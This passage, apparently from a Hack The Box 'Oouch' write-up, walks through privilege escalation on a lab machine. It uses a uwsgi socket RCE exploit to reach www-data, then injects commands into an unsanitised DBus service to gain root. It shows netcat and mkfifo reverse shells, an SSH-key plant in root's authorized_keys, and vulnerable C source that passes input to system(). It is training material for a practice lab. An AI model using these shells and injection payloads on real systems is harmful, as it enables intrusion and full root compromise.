uwsgi.ini --chmod-sock=666</span><br></pre></td></tr></table></figure>

<p>So far it’s not very useful. Let’s continue our recon.</p>
<h3 id="DBus-htb-oouch-Block-Interface"><a href="#DBus-htb-oouch-Block-Interface" class="headerlink" title="DBus htb.oouch.Block Interface"></a>DBus htb.oouch.Block Interface</h3><p>While checking for the reason the contact page got SSRF in <code>oouch/route.py</code> I stumbled upon <code>DBus</code> logic:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contact</span>():</span></span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">if</span> primitive_xss.search(form.textfield.data):</span><br><span class="line">        bus = dbus.SystemBus()</span><br><span class="line">        block_object = bus.get_object(<span class="string">&#x27;htb.oouch.Block&#x27;</span>, <span class="string">&#x27;/htb/oouch/Block&#x27;</span>)</span><br><span class="line">        block_iface = dbus.Interface(block_object, dbus_interface=<span class="string">&#x27;htb.oouch.Block&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        client_ip = request.environ.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>, request.remote_addr)</span><br><span class="line">        response = block_iface.Block(client_ip)</span><br><span class="line">        bus.close()</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;hacker.html&#x27;</span>, title=<span class="string">&#x27;Hacker&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> It’s very probably the <code>IPS</code> that the admin was talking about on his <code>note.txt</code>. If an XSS attempt is detected in the message body, a message containing the user IP is sent trough the <code>htb.oouch.Block</code> interface. Then the user gets redirected to an <code>hacker.html</code> page. Following the <code>note.txt</code> we can guess that a <code>DBus</code> server is running somewhere and adding the IP addresses received as messages through the <code>htb.oouch.Block</code> to an <code>iptables</code> denylist.</p>
<p>As far as I understand it’s actually a smart idea since it allows a -somewhat- secure communication between the docker container and the host.</p>
<p>Let’s see if we can find more informations about this <code>DBus</code> server.</p>
<p>Trying to manually send <code>dbus</code> message return an error message explaining we don’t have the correct rights to send messages.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block <span class="string">&quot;string:test&quot;</span></span><br><span class="line">Error org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; <span class="built_in">type</span>=<span class="string">&quot;method_call&quot;</span>, sender=<span class="string">&quot;:1.748&quot;</span> (uid=1000 pid=6614 comm=<span class="string">&quot;dbus-send --system --print-reply --dest=htb.oouch.&quot;</span>) interface=<span class="string">&quot;htb.oouch.Block&quot;</span> member=<span class="string">&quot;Block&quot;</span> error name=<span class="string">&quot;(unset)&quot;</span> requested_reply=<span class="string">&quot;0&quot;</span> destination=<span class="string">&quot;htb.oouch.Block&quot;</span> (uid=0 pid=2572 comm=<span class="string">&quot;/root/dbus-server &quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Going back to the docker host we find the config file related to the DBus <code>htb.oouch.Block</code> Interface:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat /etc/dbus-1/system.d/htb.oouch.Block.conf</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;!-- -*- XML -*- --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE busconfig PUBLIC</span><br><span class="line"> <span class="string">&quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;</span></span><br><span class="line"> <span class="string">&quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;busconfig&gt;</span><br><span class="line"></span><br><span class="line">    &lt;policy user=<span class="string">&quot;root&quot;</span>&gt;</span><br><span class="line">        &lt;allow own=<span class="string">&quot;htb.oouch.Block&quot;</span>/&gt;</span><br><span class="line">    &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">        &lt;policy user=<span class="string">&quot;www-data&quot;</span>&gt;</span><br><span class="line">                &lt;allow send_destination=<span class="string">&quot;htb.oouch.Block&quot;</span>/&gt;</span><br><span class="line">                &lt;allow receive_sender=<span class="string">&quot;htb.oouch.Block&quot;</span>/&gt;</span><br><span class="line">        &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/busconfig&gt;</span><br></pre></td></tr></table></figure>

<p>We can understand from the configs files we found so far that the app inside the container is communicating with its host and that only <code>www-data</code> is allowed to communicate on this channel.</p>
<p>We need to find a way to pivot to <code>www-data</code> in order to send command through DBus interface. This should also allows us to run command on host as <code>root</code>.</p>
<h3 id="Pivot-qtc-gt-docker-www-data"><a href="#Pivot-qtc-gt-docker-www-data" class="headerlink" title="Pivot qtc -&gt; docker www-data"></a>Pivot qtc -&gt; docker www-data</h3><p>If you remember <code>uwsgi.ini</code> config file, we know that <code>uwsgi.ini</code> is running as <code>www-data</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line">module = oouch:app</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">master = <span class="literal">true</span></span><br><span class="line">processes = 10</span><br><span class="line">socket = /tmp/uwsgi.socket</span><br><span class="line">chmod-sock = 777</span><br><span class="line">vacuum = <span class="literal">true</span></span><br><span class="line">die-on-term = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>Searching online lead us to a neat <a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">vulnerability leading to Remote Code Execution in <code>uwsgi</code></a>. Let’s give it a try!</p>
<p>First we need to download it on our machine, then transfer it to the box and finally send it to the docker container. To ease to exploit process we are also going to transfer our <code>netcat</code> binary since it’s not installed on the container:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py</span><br><span class="line">[hg8@archbook ~]$ scp -i qtcssh uwsgi_exp.py qtc@oouch.htb:/tmp/.hg8</span><br><span class="line">uwsgi_exp.py    100%  124KB  89.7KB/s   00:01</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/tmp/.hg8$ cp /bin/nc .</span><br><span class="line">qtc@oouch:/tmp/.hg8$ scp -i ~/.ssh/id_rsa uwsgi_exp.py qtc@172.18.0.5:/tmp</span><br><span class="line">uwsgi_exp.py    100%  124KB  73.8MB/s   00:00</span><br><span class="line">qtc@oouch:/tmp/.hg8$ scp -i ~/.ssh/id_rsa nc qtc@172.18.0.5:/tmp</span><br><span class="line">nc     100%   27KB  22.8MB/s   00:00</span><br></pre></td></tr></table></figure>

<p>The exploit can be run using HTTP, TCP or Unix socket mode. Let’s use the socket mode since the <code>uwsgi.ini</code> told us where it’s stored (<code>/tmp/uwsgi.socket</code>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/tmp/.hg8$ ssh -i ~/.ssh/id_rsa qtc@172.18.0.5</span><br><span class="line">Linux aeb4525789d8 4.19.0-8-amd64 <span class="comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Fri May 15 13:11:04 2020 from 172.18.0.1</span><br><span class="line">qtc@aeb4525789d8:~$ ls /tmp/</span><br><span class="line">nc  uwsgi.socket  uwsgi_exp.py</span><br></pre></td></tr></table></figure>

<p>Let’s open our listener on <code>qtc</code> host:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/$ nc -nlvp 8585</span><br><span class="line">listening on [any] 8585 ...</span><br></pre></td></tr></table></figure>

<p> And run the exploit:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:~$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">qtc@aeb4525789d8:/tmp$ python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c <span class="string">&quot;/tmp/nc -e /bin/bash 172.18.0.1 8585&quot;</span></span><br><span class="line">[*]Sending payload.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 146, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 143, <span class="keyword">in</span> main</span><br><span class="line">    <span class="built_in">print</span>(curl(args.mode.lower(), args.uwsgi_addr, payload, <span class="string">&#x27;/testapp&#x27;</span>))</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 110, <span class="keyword">in</span> curl</span><br><span class="line">    <span class="built_in">return</span> ask_uwsgi(addr_and_port, mode, var)</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 77, <span class="keyword">in</span> ask_uwsgi</span><br><span class="line">    s.send(pack_uwsgi_vars(var) + body.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 26, <span class="keyword">in</span> pack_uwsgi_vars</span><br><span class="line">    pk += sz(k) + k.encode(<span class="string">&#x27;utf8&#x27;</span>) + sz(v) + v.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">  File <span class="string">&quot;uwsgi_exp.py&quot;</span>, line 18, <span class="keyword">in</span> sz</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[0] == 3: import bytes</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;bytes&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Since we are using Python 3 let’s tweak the exploit a little to make it compatible:</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- if sys.version_info[0] == 3: import bytes</span></span><br><span class="line"><span class="deletion">- s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="addition">+ s = bytes.fromhex(s)</span></span><br></pre></td></tr></table></figure>

<p>And we can run it again:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c <span class="string">&quot;/tmp/nc -e /bin/bash 172.18.0.1 8585&quot;</span></span><br><span class="line">[*]Sending payload.</span><br></pre></td></tr></table></figure>

<p>A new connection appear on our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/tmp/.hg8$ nc -nlvp 8585</span><br><span class="line">listening on [any] 8585 ...</span><br><span class="line">connect to [172.18.0.1] from (UNKNOWN) [172.18.0.5] 40206</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h3 id="DBus-privilege-escalation"><a href="#DBus-privilege-escalation" class="headerlink" title="DBus privilege escalation"></a>DBus privilege escalation</h3><p>Alright we are now connect as <code>www-data</code>, we should be able to freely send <code>dbus</code> message on the <code>htb.oouch.Block</code> interface. We know that the <code>dbus</code> server is used to add <code>iptable</code> entries with the IP sent as <code>Block</code> object. Knowing this we can imagine the <code>dbus</code> server is running this kind of command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s &#123;IP&#125; -j DROP</span><br></pre></td></tr></table></figure>

<p>So maybe if the message is not properly sanitized we can achieved remote code execution ? For example sending the following command injection payload: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;touch /tmp/pwnd;</span><br></pre></td></tr></table></figure>

<p>Will result in the following command being run:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s ;touch /tmp/pwnd; -j DROP</span><br></pre></td></tr></table></figure>

<p>Well, here is the theory so now let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@aeb4525789d8:/$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block <span class="string">&quot;string:;/bin/touch /tmp/pwnd;&quot;</span></span><br><span class="line">method <span class="built_in">return</span> time=1589554703.938058 sender=:1.3 -&gt; destination=:1.1037 serial=7 reply_serial=2</span><br><span class="line">  string <span class="string">&quot;Carried out :D&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:/$ ls -l /tmp/pwnd</span><br><span class="line">-rw-r--r-- 1 root root 0 May 15 21:38 /tmp/pwnd</span><br></pre></td></tr></table></figure>

<p>Awesome it worked! Let’s now use the Remote Code Execution vulnerability to get a <code>root</code> shell. </p>
<h4 id="Method-1-SSH-authorized-keys"><a href="#Method-1-SSH-authorized-keys" class="headerlink" title="Method 1: SSH authorized_keys"></a>Method 1: SSH authorized_keys</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@aeb4525789d8:/$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block <span class="string">&quot;string:;/bin/echo \&quot;ssh-rsa AAA[...]2E= hg8@htb.htb\&quot; &gt;&gt; /root/.ssh/authorized_keys;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Then login using SSH:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb root@oouch.htb</span><br><span class="line">Linux oouch 4.19.0-8-amd64 <span class="comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Tue Feb 25 12:54:48 2020</span><br><span class="line">root@oouch:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@oouch:~<span class="comment"># cat root.txt</span></span><br><span class="line">cxxxxxxxxxxxxxxxxxxx3</span><br><span class="line">root@oouch:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h4 id="Method-2-Bi-directional-netcat"><a href="#Method-2-Bi-directional-netcat" class="headerlink" title="Method 2: Bi-directional netcat"></a>Method 2: Bi-directional netcat</h4><p>This one was new to me. First let’s open our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ /tmp/nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure>

<p>Then let’s inject a bi-directional <code>netcat</code> shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@aeb4525789d8:/$ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block <span class="string">&quot;string:;mkfifo /tmp/.h; cat /tmp/.h | /bin/bash -i 2&gt;&amp;1 | nc 172.18.0.5 4444 &gt;/tmp/.h;&quot;</span></span><br><span class="line">&lt;| /bin/bash -i 2&gt;&amp;1 | nc 172.18.0.5 4444 &gt;/tmp/.h;<span class="string">&quot;</span></span><br><span class="line"><span class="string">method return time=1589553952.221350 sender=:1.3 -&gt; destination=:1.999 serial=3 reply_serial=2</span></span><br><span class="line"><span class="string">   string &quot;</span>Carried out :D<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>We get the connection on our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ /tmp/nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [172.18.0.5] from (UNKNOWN) [172.18.0.1] 41738</span><br><span class="line">root@oouch:/root<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@oouch:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cxxxxxxxxxxxxxxxxxxx3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Beyond-root"><a href="#Beyond-root" class="headerlink" title="Beyond root"></a>Beyond root</h2><p>On root home folder we found the following <code>credits.txt</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@oouch:~<span class="comment"># cat credits.txt</span></span><br><span class="line">This machine was created with the <span class="built_in">help</span> of the following tutorials:</span><br><span class="line"></span><br><span class="line">  http://0pointer.net/blog/the-new-sd-bus-api-of-systemd.html</span><br><span class="line">  https://django-oauth-toolkit.readthedocs.io/en/latest/</span><br><span class="line">  https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-i-hello-world</span><br><span class="line"></span><br><span class="line">Big thanks to all, who share their knowledge with other people!</span><br></pre></td></tr></table></figure>

<p>Couldn’t agree more!</p>
<p>We can also find the source code of the app simulating admin opening link sent through contact page, creating the SSRF. We also find the <code>dbus</code> server source code which is worth reading to understand how our command is handled once a message is sent on the <code>htb.oouch.Block</code> Interface.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;systemd/sd-bus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">method_block</span><span class="params">(sd_bus_message *m, <span class="keyword">void</span> *userdata, sd_bus_error *ret_error)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>* host = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read the parameters */</span></span><br><span class="line">        r = sd_bus_message_read(m, <span class="string">&quot;s&quot;</span>, &amp;host);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to obtain hostname: %s\n&quot;</span>, strerror(-r));</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> command[] = <span class="string">&quot;iptables -A PREROUTING -s %s -t mangle -j DROP&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> command_len = <span class="built_in">strlen</span>(command);</span><br><span class="line">        <span class="keyword">int</span> host_len = <span class="built_in">strlen</span>(host);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>* command_buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((host_len + command_len) * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">if</span>(command_buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to allocate memory\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf</span>(command_buffer, command, host);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* In the first implementation, we simply ran command using system(), since the expected DBus</span></span><br><span class="line"><span class="comment">         * to be threading automatically. However, DBus does not thread and the application will hang</span></span><br><span class="line"><span class="comment">         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real</span></span><br><span class="line"><span class="comment">         * multithreading)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( pid == <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">/* Here we are in the child process. We execute the command and eventually exit. */</span></span><br><span class="line">            system(command_buffer);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Here we are in the parent process or an error occured. We simply send a genric message.</span></span><br><span class="line"><span class="comment">             * In the first implementation we returned separate error messages for success or failure.</span></span><br><span class="line"><span class="comment">             * However, now we cannot wait for results of the system call. Therefore we simply return</span></span><br><span class="line"><span class="comment">             * a generic. */</span></span><br><span class="line">            <span class="keyword">return</span> sd_bus_reply_method_return(m, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;Carried out :D&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r = system(command_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The vtable of our little object, implements the net.poettering.Calculator interface */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> sd_bus_vtable block_vtable[] = &#123;</span><br><span class="line">        SD_BUS_VTABLE_START(<span class="number">0</span>),</span><br><span class="line">        SD_BUS_METHOD(<span class="string">&quot;Block&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;s&quot;</span>, method_block, SD_BUS_VTABLE_UNPRIVILEGED),</span><br><span class="line">        SD_BUS_VTABLE_END</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Main method, registeres the htb.oouch.Block service on the system dbus.</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Paramaters:</span></span><br><span class="line"><span class="comment">         *      argc            (int)             Number of arguments, not required</span></span><br><span class="line"><span class="comment">         *      argv[]          (char**)          Argument array, not required</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Returns:</span></span><br><span class="line"><span class="comment">         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive</span></span><br><span class="line"><span class="comment">         *      as long as the user keeps it alive.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */</span></span><br><span class="line">        signal(SIGCHLD,SIG_IGN);</span><br><span class="line"></span><br><span class="line">        sd_bus_slot *slot = <span class="literal">NULL</span>;</span><br><span class="line">        sd_bus *bus = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* First we need to connect to the system bus. */</span></span><br><span class="line">        r = sd_bus_open_system(&amp;bus);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to connect to system bus: %s\n&quot;</span>, 